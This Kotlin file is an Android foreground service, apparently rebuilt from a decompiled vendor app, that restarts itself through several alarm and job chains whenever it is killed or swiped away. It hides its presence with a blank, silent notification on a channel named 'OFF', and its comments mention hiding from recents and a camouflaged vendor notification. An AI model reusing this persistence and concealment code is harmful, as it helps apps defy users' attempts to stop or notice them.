package com.storm.safe.rock.service

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import com.storm.safe.rock.service.modules.protection.RecentsGuardManager

/**
 * Foreground Service that keeps the app alive.
 *
 * Reverse-engineered from JADX: service/AppCoreService.java (177 LOC).
 *
 * Key behaviors:
 * - Companion object C0277a0 with isRunning() and start(context)
 * - onCreate() creates foreground notification and sets running = true
 * - onStartCommand() starts foreground, schedules 60s alarm, schedules guard; returns START_STICKY
 * - onDestroy() clears hiding flag, restarts self, schedules recovery jobs + 4 restart alarms
 * - onTaskRemoved() same recovery as onDestroy with different request codes
 * - scheduleAlarm() generic AlarmManager helper (requestCode, action, delayMs)
 */
class AppCoreService : Service() {

    companion object {
        private const val TAG = "AppCoreService"
        const val CHANNEL_ID = "core_service"

        /** JADX: startForeground(10086, notification) */
        const val NOTIFICATION_ID = 10086

        /** PendingIntent flags: FLAG_UPDATE_CURRENT | FLAG_IMMUTABLE */
        // ADAPT: 201326592 = FLAG_UPDATE_CURRENT(0x08000000) | FLAG_IMMUTABLE(0x04000000)
        private const val PI_FLAGS = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE

        // JADX: f52297a1 — volatile running flag
        @Volatile
        private var running = false

        /** JADX: C0277a0.getRunning() / isRunning() */
        fun isRunning(): Boolean = running

        /**
         * JADX: C0277a0.start(context)
         *
         * Start AppCoreService as foreground service (API 26+) or regular service.
         */
        fun start(context: Context) {
            // ADAPT: JADX does not check isRunning before start, but our skeleton did.
            // Vendor logic: always tries to start, no running check in C0277a0.start.
            // We keep the running guard for compatibility with existing callers.
            if (running) return
            try {
                val intent = Intent(context, AppCoreService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "启动 AppCoreService 失败", e)
            }
        }
    }

    // ── Service Lifecycle ──

    override fun onCreate() {
        super.onCreate()
        running = true
        startForegroundNotification()
    }

    /**
     * JADX: onStartCommand
     *
     * 1. Restart foreground notification (ensures it's showing)
     * 2. Schedule 60s backup sync alarm
     * 3. Schedule guard alarm via tisxhskrc
     * 4. Return START_STICKY for auto-restart
     */
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNotification()
        // JADX: m211383a0(99, "com.storm.safe.rock.action.BACKUP_SYNC", 60000)
        scheduleAlarm(99, tisxhskrc.ACTION_BACKUP_SYNC, 60_000L)
        // JADX: tisxhskrc.f55188a0.scheduleGuard(applicationContext)
        tisxhskrc.scheduleGuard(applicationContext)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    /**
     * JADX: onDestroy
     *
     * Recovery chain:
     * 1. Set running = false
     * 2. Clear hiding-from-recents flag (C0356a1.f53714b2.clearHidingFlag)
     * 3. Restart self (startForegroundService)
     * 4. Schedule immediate restart + crash recovery jobs (zgafaqvswksa)
     * 5. Schedule 4 restart alarms at 500ms, 1500ms, 5000ms, 15000ms
     */
    override fun onDestroy() {
        super.onDestroy()
        running = false

        // JADX: C0356a1.f53714b2.clearHidingFlag() → RecentsGuardManager.hidingFromRecentsFlag = false
        try {
            RecentsGuardManager.hidingFromRecentsFlag = false
        } catch (_: Exception) {
        }

        // JADX: m211384a1() — restart self
        restartSelf()

        // JADX: zgafaqvswksa.scheduleImmediateRestart + scheduleCrashRecovery
        zgafaqvswksa.scheduleImmediateRestart(applicationContext)
        zgafaqvswksa.scheduleCrashRecovery(applicationContext)

        // JADX: 4 restart alarms with request codes 2, 12, 3, 13
        scheduleAlarm(2, tisxhskrc.ACTION_QUICK_SYNC, 500L)
        scheduleAlarm(12, tisxhskrc.ACTION_QUICK_SYNC, 1_500L)
        scheduleAlarm(3, tisxhskrc.ACTION_BACKUP_SYNC, 5_000L)
        scheduleAlarm(13, tisxhskrc.ACTION_BACKUP_SYNC, 15_000L)
    }

    /**
     * JADX: onTaskRemoved
     *
     * Same recovery as onDestroy but with different alarm request codes (1, 10, 0, 11).
     */
    override fun onTaskRemoved(intent: Intent?) {
        // JADX: C0356a1.f53714b2.clearHidingFlag()
        try {
            RecentsGuardManager.hidingFromRecentsFlag = false
        } catch (_: Exception) {
        }

        // JADX: m211384a1() — restart self
        restartSelf()

        // JADX: zgafaqvswksa.scheduleImmediateRestart + scheduleCrashRecovery
        zgafaqvswksa.scheduleImmediateRestart(applicationContext)
        zgafaqvswksa.scheduleCrashRecovery(applicationContext)

        // JADX: 4 restart alarms with request codes 1, 10, 0, 11
        scheduleAlarm(1, tisxhskrc.ACTION_QUICK_SYNC, 500L)
        scheduleAlarm(10, tisxhskrc.ACTION_QUICK_SYNC, 1_500L)
        scheduleAlarm(0, tisxhskrc.ACTION_BACKUP_SYNC, 5_000L)
        scheduleAlarm(11, tisxhskrc.ACTION_BACKUP_SYNC, 15_000L)

        super.onTaskRemoved(intent)
    }

    // ── Internal Methods ──

    /**
     * JADX: m211383a0(requestCode, action, delayMs)
     *
     * Generic AlarmManager scheduling helper.
     * Uses ELAPSED_REALTIME_WAKEUP + setExactAndAllowWhileIdle (or fallback).
     */
    private fun scheduleAlarm(requestCode: Int, action: String, delayMs: Long) {
        try {
            val systemService = getSystemService("alarm")
            val alarmManager = systemService as? AlarmManager ?: return

            val intent = Intent(applicationContext, tisxhskrc::class.java).apply {
                this.action = action
            }
            val broadcast = PendingIntent.getBroadcast(
                applicationContext, requestCode, intent, PI_FLAGS
            )

            // JADX: canScheduleExactAlarms check on API 31+
            val canExact = if (Build.VERSION.SDK_INT >= 31) {
                alarmManager.canScheduleExactAlarms()
            } else {
                true
            }
            val triggerAt = SystemClock.elapsedRealtime() + delayMs
            if (canExact) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, broadcast
                )
            } else {
                alarmManager.setAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, broadcast
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "设置${delayMs}ms Alarm失败", e)
        }
    }

    /**
     * JADX: m211384a1() — restart self via startForegroundService / startService.
     */
    private fun restartSelf() {
        try {
            val intent = Intent(applicationContext, AppCoreService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(intent)
            } else {
                applicationContext.startService(intent)
            }
        } catch (_: Exception) {
            // Ignore restart failure
        }
    }

    /**
     * JADX: m211385a2() — create notification channel and start foreground.
     *
     * JADX calls C1351vv.m214962a3(this) for channel creation and
     * C1351vv.m214961a2(this) for notification building.
     * On API 34+, uses FOREGROUND_SERVICE_TYPE_SPECIAL_USE (1073741824).
     *
     * ADAPT: C1351vv is a large multi-purpose class. We use simplified channel/notification
     * matching the vendor behavior (IMPORTANCE_MIN, no sound/badge, brand-specific icon).
     */
    private fun startForegroundNotification() {
        try {
            createNotificationChannel()
            val notification = createNotification()
            if (Build.VERSION.SDK_INT >= 34) {
                // JADX: startForeground(10086, notification, 1073741824)
                // 1073741824 = FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                startForeground(NOTIFICATION_ID, notification, 1073741824)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "启动前台服务失败", e)
        }
    }

    /**
     * JADX: C1351vv.m214962a3(context) — create/update notification channel.
     *
     * Vendor logic:
     * 1. Delete old "svc_ch" channel
     * 2. Check if "OFF" channel exists with IMPORTANCE_LOW → delete it
     * 3. Create new "OFF" channel with IMPORTANCE_MIN, no sound/badge/lights/vibration
     *
     * ADAPT: Simplified to single CHANNEL_ID. Vendor uses "OFF" as channel ID.
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager

            // JADX: delete old channel "svc_ch" if exists
            try { nm.deleteNotificationChannel("svc_ch") } catch (_: Exception) {}

            // JADX: check "OFF" channel, delete if importance too high
            val existing = nm.getNotificationChannel(CHANNEL_ID)
            if (existing != null && existing.importance == NotificationManager.IMPORTANCE_LOW) {
                nm.deleteNotificationChannel(CHANNEL_ID)
            }

            // JADX: create "OFF" channel with IMPORTANCE_MIN
            val channel = NotificationChannel(
                CHANNEL_ID, "OFF",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = ""
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                if (Build.VERSION.SDK_INT >= 29) {
                    setAllowBubbles(false)
                }
            }
            nm.createNotificationChannel(channel)
        }
    }

    /**
     * JADX: C1351vv.m214961a2(service) — create foreground notification.
     *
     * Vendor builds a brand-specific notification with camouflaged title/icon.
     * ADAPT: Simplified to minimal silent notification matching vendor behavior.
     */
    private fun createNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build().also { notification ->
                    // JADX: explicitly zero out all audio/LED
                    notification.defaults = 0
                    notification.ledARGB = 0
                    notification.ledOnMS = 0
                    notification.ledOffMS = 0
                    notification.flags = notification.flags and Notification.FLAG_INSISTENT.inv()
                    notification.sound = null
                }
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build().also { notification ->
                    notification.defaults = 0
                    notification.ledARGB = 0
                    notification.ledOnMS = 0
                    notification.ledOffMS = 0
                    notification.flags = notification.flags and Notification.FLAG_INSISTENT.inv()
                    notification.sound = null
                }
        }
    }
}
